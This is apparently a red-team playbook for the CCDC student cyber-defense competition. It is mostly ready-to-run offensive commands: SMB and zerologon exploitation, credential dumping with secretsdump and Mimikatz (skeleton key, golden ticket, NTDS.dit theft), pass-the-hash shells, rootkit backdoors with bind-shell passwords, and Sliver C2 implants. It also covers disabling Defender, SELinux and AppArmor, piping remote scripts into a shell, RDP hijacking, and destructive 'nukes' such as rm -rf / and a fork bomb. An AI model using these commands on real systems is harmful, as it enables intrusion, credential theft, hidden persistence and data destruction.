---
layout: blank
pagetitle: Red Teaming for CCDC
---

## Playbook

- Make sure to have a sheet with all host/shell info, so if we lose a shell we know where we lost it
- Before competition start, have kali already hosting a Linux implant/beacon, Windows implant/beacon, and our persistence scripts/binaries. 
- Opening Salvo:
  - Quickly nmap scan for port 445, as this will almost always be our gateway in
  - `sudo nmap -T4 -min-hostgroup 96 -p 53,445 --open {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > smb_ips.txt`
    - `-min-hostgroup` will divide the range up into 96 sup parts
    - Instead of `-T4`, we can specify `--max-retries 2 --max-rtt-timeout {double_time_to_ping}ms --min-rate 300`
  - Then, check SMB IPs with `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < smb_ips.txt` 
    - If we get a zerologon hit, run `zerologon.py` and then `impacket-secretsdump -just-dc -no-pass {domain}/{machine_name}:@{DC_IP}`
      - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (if DC name is TEST-DC)
  - Simultaneously run a scan for all port 22s (so we can use them when we find the default password)
    - `sudo nmap -sV -O -T4 -min-hostgroup 96 -p 22 {IP_range}`
  - Additionally, one final `sudo nmap -sn -T4 {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
    - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`

## Autorecon
- Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
- Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
- Anonymous access: `grep -r "Anonymous" autorecon_results`
- Find DC: `grep -r "Domain Controller" autorecon_results`
- Passwords: `grep -r "Password:\|Credentials:" autorecon_results`
- Missing SMB signing: `grep -r "SMB signing required: false" autorecon_results`

## Machine Persistence

**Windows:**
- Todo
  - Write a persistence script that does the following 
    - (maybe) Creates an exclusion for ProgramData AND/OR disables defender
    - Downloads and executes Mimikatz's skeleton key module
    - Downloads sliver shell and creates a sliver service hidden with ACLs
  - Investigate hiding services with ACLs: https://www.sans.org/blog/red-team-tactics-hiding-windows-services
    - This seems extremely good
  - Pivoting with netsh port proxy
  - C2s
    - BOAZ: https://github.com/thomasxm/BOAZ_beta
    - ChromeAlone: https://github.com/praetorian-inc/ChromeAlone
    - HiddenDesktop: https://github.com/WKL-Sec/HiddenDesktop
    - Test out some payloads
  - Hidden RDP
    - Patching termsrv - https://freedium.cfd/https://samdecrock.medium.com/patching-microsofts-remote-desktop-service-yourself-db25a4d8bc64
      - This allows multiple users RDP as one user
    - Found a repo: https://github.com/f3di006/hRDP
  - DarkLnk - creates disguised .lnk files that run powershell but look like something else
    - https://github.com/wariv/Darklnk
- When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
- First, run [windows_add_payloads.ps1 -src {path_to_exe}](https://khaelkugler.com/scripts/windows_add_payloads.ps1.txt) to add the file to each of the locations
- Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1.txt)
  - Removing persistence:
    - Delete payloads from all locations
    - Schtask: `Unregister-ScheduledTask -TaskName "WindowsUpdater" -Confirm:$false`
    - Registry Run Key: Delete registry entries from both locations
    - Shortcut in Startup: `rm 'C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.lnk'`
    - Service: `Stop-Service -Name "WinUpdaterSvc"` and `$service = Get-WmiObject -Class Win32_Service -Filter "Name='WinUpdaterSvc'"; $service.delete()`
    - Registry UserInit: Remove 2nd path and 2nd comma from `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
    - Registry Logon Script: Remove path from `HKCU:\Environment`
- Shells:
  - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
  - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
  - 593 - use `atexec.py -hashes :{hash} '{domain}/{user}@{ip}' "{command}"`
  - 3389 - user `xfreerdp3 /u:{user} /d:{domain} /pth:{hash} /v:{IP}`
    - `/p:{password}` if we have it
  - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
    - `-r` optional, used for kerberos
- Persisting via the `Guest` account
  - After enabling/providing administrator to Guest and adding it to the `Remote Desktop Users` group, we might still need to configure group policy:
    - `secedit /export /cfg C:\Windows\temp\secpol.inf`
    - Modify the "SeDenyInteractiveLogonRight" line and remove the `Guest` account
    - Reimport with `secedit /configure /db C:\Windows\temp\secedit.sdb /cgf C:\Windows\temp\secpol.inf`
    - Then update GP with `gpupdate /force`

**Linux:**
- [PANIX](https://github.com/Aegrah/PANIX)
  - One-stop shop for lots of persistence methods, this thing is a great reference
- Todo:
  - Touch up script
    - Clean up boopkit
      - `/root/.boopkit/` and install dir `/boopkit/`
    - Make sure all dates are changed as necessary
    - Fix script not self-deleting
  - Test on arch? Def test on centos/fedora
- [Boopkit](https://github.com/krisnova/boopkit)
  - Sneaky amazing backdoor that functions via back checksum TCP packets
  - `wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.4.1.tar.gz`
    - `apt install clang make bpftool libbpf-dev gcc-multilib llvm libxdp-dev libpcap-dev`
  - Then, run on victim with `boopkit -i {network_interface} -q`
    - We need to find a way to get the default network interface
  - Then, after making on Kali, can run `boopkit-boop -rhost {target} -rport 3535 -c '{command}' -lhost {kali_IP} -lport {kali_port}`
  - Listens on TCP 3545 
- [Prism](https://github.com/andreafabrizi/prism)
  - `gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c` or if that fails just download and run `prism`
  - Then run `sudo python2 sendPacket.py {target_IP} {password} {attacker_IP} {attacker_port}`
- [BDS](https://github.com/bluedragonsecurity/bds_lkm_ftrace)
  - Good compatibility, works on 6.x tested
    - Let's check out the non-ftrace one and userland one?
    - We need to slightly modify to allow hiding arbitrary ports/sockets
    - Removed `rc.local` persistence - non-sneaky, and borks systems with checks for kernel tainting in startup
  - Supports hiding files, backdoors, privescs, and hiding network connections (though only its connection, but we can easily change that)
    - Root with `kill 000`
    - Open bind shell with `nc {target_IP} 1338` and then access with `nc {target_IP} 31337` with password `bluedragonsec`
  - Config
    - Can be specified in `kernelspace/includes/bds_vars.h`
- [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
  - Absolutely nutty rootkit for 2.6.x, 3.x, or 4.x, seems to be the go-to
    - Has persistent, detection evasion, a nice management interface
  - Downloadable [here](https://web.archive.org/web/20240220194314/https://codeload.github.com/f0rb1dd3n/Reptile/zip/refs/heads/master)
  - Wiki [here](https://web.archive.org/web/20201226000229/https://github.com/f0rb1dd3n/Reptile/wiki/Install)
  - Config:
    - In `config/defconfig`, then after configuring we run `make defconfig`
  - Install:
    - `apt install build-essential linux-headers-$(uname -r)`
    - `make menuconfig`, `make`, and `make install`
  - Bugs:
    - Reptile will hide more stuff than necessary in affected directories
      - Until we fix this, we can rename `/reptile` to `/reptiled`
    - Couldn't get kali-side build working, so we can use prism for the shell
  - Usage:
    - `/reptile/reptile_cmd {show/hide}` to show/hide all hidden files
    - `/reptile/reptile_cmd root` to get root
    - `/reptile/reptile_cmd {show/hide} {pid}` to show/hide processes
    - `/reptile/reptile_cmd conn {IP} {show/hide}` to show/hide ICP/UDP connections
    - Content between `#<reptile>` and `#</reptile>` will be hidden
      - Can be toggled with `reptile_cmd file-tampering`
      - Works with both adding users to `/etc/passwd` and cron jobs
        - Actually, having some trouble getting it working with cron jobs
      - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
- [Caraxes](https://github.com/ait-aecid/caraxes/)
  - Seems to be pretty good for 5.14-6.11, but a bit lacking on functionality
    - This one would make a nice starting place for building our own
  - Will need to uncomment the `hide_module()` function
  - Good for hiding files - we can set the word to hide in `rootkit.h`
- [BrokePKG](https://github.com/R3tr074/brokepkg)
  - Install dependencies with `./scripts/dependencies.sh`
  - Config in `./include/config.h`
  - Seems to work on 5.x and 6.x? Less functionality than BDS, but a good backup


## Domain Persistence

**Skeleton Key**
- Implants into LSASS and creates master password working for any AD account
- `mimikatz "privilege::debug" "misc::skeleton" "exit"` - adds `mimikatz` as a password to all users

**MemSSP**
- Injects a new Security Support Provider into LSASS
- `mimikatz "privilege::debug" "misc::memssp" "exit"`
  - Can follow this up with `misc::lock /process:explorer.exe` to LOG OUT active users!!
- After each authentication, password is stored in `C:\Windows\System32\mimilsa.log` or `C:\Windows\System32\kiwissp.log`

**Golden Certificate**
- Performed with:
  - `certipy ca -backup -ca '{certificate_name}' -username {user}@{domain} -hashes {hash}`
  - `certipy forge -ca-pfx {ca_private_key} -upn {user}@{domain} -subject 'CN={user},CN=Users,DC={domain},DC={tld}`

**Golden Ticket**
- Trying to get the KDC's secret key to create self-made tickets for any service on the system
- Requires full control over the DC or a being part of a Domain Admin group
- Dump `krbtgt` NTLM hash with mimikatz (unless we already have it)
	- `lsadump::lsa /patch`
- After grabbing the hash, from any domain user:
	- `kerberos::purge` to delete any existing tickets
	- `kerberos::golden /user:{domain_user} /domain:{domain} /sid:{domain_SID} /krbtgt:{krbtgt_NTLM_hash} /ptt`
		- The `domain_SID` can be gathered from whoami /user
- This will essentially give the domain user Domain Admin privileges
	- `PsExec.exe \\{domain_controller_dnshostname} powershell`
		- Can't use the IP of the DC, as that will resort to NTLM
		
**Shadow Copies**
- Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
- As a domain admin, we can create a shadow copy and extract the NTDS.dit database file
- Installed from [here](https://www.microsoft.com/en-us/download/details.aspx?id=23490)
- Run `vshadow.exe -nw -p C:`
- Then copy the Database from the shadow copy to the C: folder
	- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
- Then, save the SYSTEM hive with `reg.exe save hklm\system c:\system.bak`
- We can now access all NTLM hashes and Kerberos keys using `impacket-secretsdump`
	- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

## Sliver
- Can build from source with `sudo apt install golang-go`, `curl https://sliver.sh/install | sudo bash`, and `cd sliver && make`
- To make sure we don't kill the mf server, let's operate from a client
  - Start up tmux and run `sliver-server`
  - On the server: `new-operator --name {op_name} --lhost localhost` and `multiplayer` to enable clients
  - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
- `wg` can be used to start listening for incoming sessions on a sneaky wireguard udp (use mtls otherwise if we dont get a callback)
  - **IMPORTANT!!** `evil-winrm` implants and beacons (and sometimes maybe `wmi-exec`?) will DIE a HORRIBLE DEATH, use another method to run the implant/beacon
- Then, use `generate` to create implants or beacons
  - `generate --wg {our_IP} --os linux` for an implant
  - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
  - Windows: `generate --mtls 192.168.0.102 --os windows` 
  - If we need to pivot, use `--tcp-pivot {IP}` and then we can see our pivots with `pivots tcp`
- `sessions` to show active sessions
  - `sessions -i {id}` to interact with session
    - `CTRL + d` to exit
    - `shell {command}` will execute command in a session (can maybe run without `shell`?)
    - `getprivs` will list privileges available, probably use /ProgramData/ for potatoes?
    - `info` - host info
    - `ps` - process list
    - `upload`/`download` - file transfer
    - `screenshot` - grab a screenshot
- `beacons` to show active beacons
  - `use {beacon_id}` to use a beacon
    - `interactive` to turn it into a normal session
- Armory:
  - Install all with `armory install all`
  - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`

## Messing with Blue Team

**Killing Services**
- Soft breaks:
  - `systemctl stop {service}` 
    - This is too kind, we shant do this :>
  - Edit service configs
  - Drop 50% of incoming firewall packets
  - `keyboard_desktop_flipper.sh`
  - `service_stopper.sh`
  - `command_rotate.sh`
- Hard breaks:
  - Delete configs
  - Destructive firewall rules
  - Remove scoring assets
  - Delete entire binaries/files
  - `ip_rotate.sh`
- Nukes:
  - `rm -rf / -no-preserve-root`
  - `del /Q /S`
  - Fork bombing (`:(){ :|:& };:`)
  - `timebomb.sh`
  - Corrupt bootloader partitions

**Trolling**
- By far the most important part of CCDC
- Spawn message box on Windows:
  - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
- Wall on linux:
  - `wall "dance"`
- Spawn 50 notepads:
  - `1..50 | ForEach-Object {Start-Process notepad}`
    - Can do something like `calc` or 
- Set all computers to same background:
  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
- `misc::wp /file:{path}` to set the current PC's wallpaper

## Dealing with System Protections

**Defender**
- If we're local admin, we can just add an exclusion:
  - `Add-MpPreference -ExclusionPath "{path_to_excluded_folder}"`
- We can spoof another antivirus with DefendNot
  - `& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "{custom_AV_name}"`
  - This does give a red defender icon, however
- Permanently disable with:
  - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
  - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
  - Just run all of these in powershell and defender should be lobotomized by the end:
    - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
    - `Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2`
      - This needs to be run before restarting (and in doing so disabling modifications of defender)
    - `Remove-WindowsFeature Windows-Defender`
    - `Stop-Service WinDefend -Force`
    - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
    - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
    - Then reboot
- Bypassing with FilelessPELoader:
  - `https://github.com/SaadAhla/FilelessPELoader`

**CS Falcon**
- Seems `wmiexec` with `-silentcommand` and `-nooutput` seems to work with CS Falcon enabled

**AppArmor**
- `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`

**SELinux**
- Status with `sestatus`
- Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
- Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot

## Misc
- Windows:
  - Shutdown: `shutdown /s /t 0`
  - Reboot: `shutdown /r /t 0`
  - See who's got an RDP session: `query user` or `query session`
    - Hijack it with `tscon.exe {target_id} /dest:rdp-tcp#{our_rdp_session_number}`
  - Logoff user:
    - `query session` and `logoff {id}` to log off a specific user
  - Powershell save path: `(Get-PSReadlineOption).HistorySavePath`
  - Get processes: `ps`
    - Kill a process: `taskkill /pid {id_from_ps} /f`
  - Search results of a command: `| FINDSTR /NI "{string}"`
    - `/N` gets line number, `/I` ignores case
- Linux:
  - `reboot` to restart
  - `who` to see who's on a system
    - `pkill -t {result}` to then kill their session
  - `pkill -KILL -u {user}` - kill all of a user's processes
  - `kill -9 {pid}` to kill a specific process
- Set date: `touch -d "4 May 2024"`

